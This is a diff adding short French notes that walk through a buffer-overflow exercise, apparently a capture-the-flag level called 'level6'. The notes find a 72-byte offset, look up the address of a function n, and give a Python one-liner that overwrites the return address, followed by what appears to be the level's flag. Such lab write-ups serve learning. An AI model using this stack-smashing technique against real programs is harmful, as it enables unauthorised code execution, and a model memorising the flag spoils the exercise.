@@ -1,0 +1,30 @@
+bufferoverflow classique par les arguments
+
+recherche de l'offset:
+	pattern create 100
+	'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+	r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+	pattern search
+	Registers contain pattern buffer:
+	EIP+0 found at offset: 72
+	EAX+0 found at offset: 72
+	No register points to pattern buffer
+	Pattern buffer found at:
+	0x0804a008 : offset    0 - size  100 ([heap])
+	0xbffff87f : offset    0 - size  100 ($sp + 0x203 [128 dwords])
+	References to pattern buffer found at:
+	0xbffff670 : 0x0804a008 ($sp + -0xc [-3 dwords])
+	0xbffff680 : 0x0804a008 ($sp + 0x4 [1 dwords])
+	0xbffff69c : 0x0804a008 ($sp + 0x20 [8 dwords])
+	0xbffff668 : 0xbffff87f ($sp + -0x14 [-5 dwords])
+	0xbffff684 : 0xbffff87f ($sp + 0x8 [2 dwords])
+	0xbffff748 : 0xbffff87f ($sp + 0xcc [51 dwords])
+
+	Offset = 72
+
+Avec un objdump -d -j .text level6 on recupere l'addresse de la fonction n : 0x8048454
+
+r $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
+
+./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"') 
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
